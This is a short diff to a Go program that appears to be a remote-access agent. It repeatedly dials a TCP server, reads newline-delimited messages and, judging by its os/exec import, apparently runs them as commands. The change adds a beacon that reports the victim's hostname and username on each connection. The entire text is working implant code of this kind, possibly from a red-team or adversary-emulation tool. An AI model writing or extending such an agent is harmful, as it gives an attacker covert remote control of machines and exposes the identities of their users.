@@ -7,10 +7,11 @@ import (
    "os/exec"
    "strings"
    "os"
+   "os/user"
    "time"
 )
 
-func listen(conn net.Conn) {
+func push(conn net.Conn) {
    for {
       message, _ := bufio.NewReader(conn).ReadString('\n')
       if len(message) == 0 {
@@ -34,6 +35,9 @@ func listen(conn net.Conn) {
 }
 
 func main() {
+   host, _ := os.Hostname()
+	user, _ := user.Current()
+   paw := fmt.Sprintf("%s$%s", host, user.Username)
    for {
       conn, err := net.Dial("tcp", "127.0.0.1:5678")
       if err != nil {
@@ -41,6 +45,7 @@ func main() {
          time.Sleep(5 * time.Second)
          continue
       }
-      listen(conn)
+      conn.Write([]byte(paw))
+      push(conn)
    }
 }
